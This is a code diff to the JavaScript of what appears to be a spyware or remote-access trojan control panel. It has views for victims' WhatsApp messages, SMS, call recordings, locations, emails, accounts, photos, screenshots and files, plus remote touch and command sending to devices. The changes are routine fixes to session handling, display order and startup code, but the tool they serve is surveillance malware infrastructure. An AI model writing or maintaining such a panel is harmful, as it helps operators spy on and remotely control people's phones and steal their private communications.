@@ -45,8 +45,10 @@ function showDashboard() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('dashboard').classList.remove('hidden');
   loadData();
+  if (autoRefreshTimer) clearInterval(autoRefreshTimer);
   autoRefreshTimer = setInterval(loadData, 30000);
 
+  if (socket) socket.disconnect();
   socket = io();
   window.socket = socket;
   socket.emit('register-admin');
@@ -64,8 +66,16 @@ function loadData() {
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
 
   fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
-    .then(r => r.json())
+    .then(r => {
+      if (r.status === 401) {
+        localStorage.removeItem('csk4_token');
+        location.reload();
+        return null;
+      }
+      return r.json();
+    })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       renderTab(currentTab);
@@ -81,8 +91,12 @@ function loadData() {
 
 function refreshStatsOnly() {
   fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
-    .then(r => r.json())
+    .then(r => {
+      if (r.status === 401) return null;
+      return r.json();
+    })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       if (['notifications','whatsapp','activities','siminfo','accounts','emails'].includes(currentTab)) {
@@ -309,7 +323,7 @@ function renderScreen() {
 
 // ============ NOTIFICATIONS ============
 function renderNotifications() {
-  const list = (allData.notifications || []).slice().reverse().slice(0, 200);
+  const list = (allData.notifications || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi notification nahi</div>';
   return list.map(n => {
     let cls = '';
@@ -331,7 +345,7 @@ function renderNotifications() {
 }
 
 function renderWhatsapp() {
-  const list = (allData.whatsapp || []).slice().reverse().slice(0, 200);
+  const list = (allData.whatsapp || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi WhatsApp message nahi</div>';
   return list.map(w => `
     <div class="notification-item whatsapp">
@@ -344,7 +358,7 @@ function renderWhatsapp() {
 }
 
 function renderMessages() {
-  const list = (allData.messages || []).slice().reverse();
+  const list = allData.messages || [];
   if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
   return list.map(m => {
     const typeColor = m.type === 'sent' ? '#4ade80' : '#4f8cff';
@@ -378,7 +392,7 @@ function renderCallLogs() {
 }
 
 function renderCallRecordings() {
-  const list = (allData.callRecordings || []).slice().reverse();
+  const list = allData.callRecordings || [];
   if (!list.length) return '<div class="loading">Koi call recording nahi</div>';
   return list.map(r => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
@@ -390,7 +404,7 @@ function renderCallRecordings() {
 }
 
 function renderLocations() {
-  const list = (allData.locations || []).slice().reverse().slice(0, 200);
+  const list = (allData.locations || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi location nahi</div>';
   return list.map(l => `
     <div class="item-card">
@@ -422,7 +436,6 @@ function renderContacts() {
   `).join('');
 }
 
-// ============ 🆕 SIM INFO ============
 function renderSimInfo() {
   const simData = allData.simInfo || {};
   const deviceIds = Object.keys(simData);
@@ -449,7 +462,6 @@ function renderSimInfo() {
   return html;
 }
 
-// ============ 🆕 ACCOUNTS ============
 function renderAccounts() {
   const accData = allData.accounts || {};
   const deviceIds = Object.keys(accData);
@@ -480,7 +492,6 @@ function renderAccounts() {
   return html;
 }
 
-// ============ 🆕 EMAILS ============
 function renderEmails() {
   const emailData = allData.emails || {};
   const deviceIds = Object.keys(emailData);
@@ -505,7 +516,7 @@ function renderEmails() {
 }
 
 function renderPhotos() {
-  const list = (allData.photos || []).slice().reverse();
+  const list = allData.photos || [];
   if (!list.length) return '<div class="loading">Koi photo nahi</div>';
   return '<div class="photos-grid">' + list.map(p => `
     <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
@@ -513,7 +524,7 @@ function renderPhotos() {
 }
 
 function renderVideos() {
-  const list = (allData.videos || []).slice().reverse();
+  const list = allData.videos || [];
   if (!list.length) return '<div class="loading">Koi video nahi</div>';
   return list.map(v => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
@@ -525,7 +536,7 @@ function renderVideos() {
 }
 
 function renderScreenshots() {
-  const list = (allData.screenshots || []).slice().reverse();
+  const list = allData.screenshots || [];
   if (!list.length) return '<div class="loading">Koi screenshot nahi</div>';
   return '<div class="photos-grid">' + list.map(p => `
     <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
@@ -533,7 +544,7 @@ function renderScreenshots() {
 }
 
 function renderAudio() {
-  const list = (allData.audio || []).slice().reverse();
+  const list = allData.audio || [];
   if (!list.length) return '<div class="loading">Koi audio nahi</div>';
   return list.map(a => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
@@ -545,7 +556,7 @@ function renderAudio() {
 }
 
 function renderFiles() {
-  const list = (allData.files || []).slice().reverse();
+  const list = allData.files || [];
   if (!list.length) return '<div class="loading">Koi file nahi</div>';
   return list.map(f => `
     <div class="item-card">
@@ -587,7 +598,7 @@ function renderBluetooth() {
 }
 
 function renderActivities() {
-  const list = (allData.activities || []).slice().reverse().slice(0, 300);
+  const list = (allData.activities || []).slice(0, 300);
   if (!list.length) return '<div class="loading">Koi activity nahi</div>';
   return list.map(a => {
     let icon = '📊';
@@ -654,7 +665,7 @@ function renderInfo() {
 }
 
 function renderCommands() {
-  const list = (allData.commands || []).slice().reverse().slice(0, 200);
+  const list = (allData.commands || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi command nahi</div>';
   return list.map(c => `
     <div class="item-card">
@@ -725,7 +736,7 @@ function sendCustomMessage() {
 }
 
 function sendTouch(action, x, y) {
-  const deviceId = document.getElementById('screenDevice').value;
+  const deviceId = document.getElementById('screenDevice')?.value;
   if (!deviceId) return alert('Device select karein');
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
@@ -781,21 +792,18 @@ function toast(m) {
   setTimeout(() => t.remove(), 3000);
 }
 
+// ============ INIT ============
 document.addEventListener('DOMContentLoaded', () => {
-  if (localStorage.getItem('csk4_token')) showDashboard();
+  if (localStorage.getItem('csk4_token')) {
+    showDashboard();
+  } else {
+    fetch(SERVER_URL + '/api/admin/status').then(r => r.json()).then(s => {
+      const m = document.getElementById('loginMongoStatus');
+      const t = document.getElementById('loginTgStatus');
+      if (m) m.textContent = s.mongo ? '💾 MongoDB: Connected' : '💾 MongoDB: Not connected';
+      if (t) t.textContent = s.telegram ? '📱 Telegram: Active' : '📱 Telegram: Not configured';
+    }).catch(() => {});
+  }
   const pass = document.getElementById('password');
   if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') login(); });
 });
-
-
-// Restore session after refresh
-if (localStorage.getItem('csk4_token')) {
-  showDashboard();
-} else {
-  fetch(SERVER_URL + '/api/admin/status').then(r => r.json()).then(s => {
-    const m = document.getElementById('loginMongoStatus');
-    const t = document.getElementById('loginTgStatus');
-    if (m) m.textContent = s.mongo ? '💾 MongoDB: Connected' : '💾 MongoDB: Not connected';
-    if (t) t.textContent = s.telegram ? '📱 Telegram: Active' : '📱 Telegram: Not configured';
-  }).catch(() => {});
-}
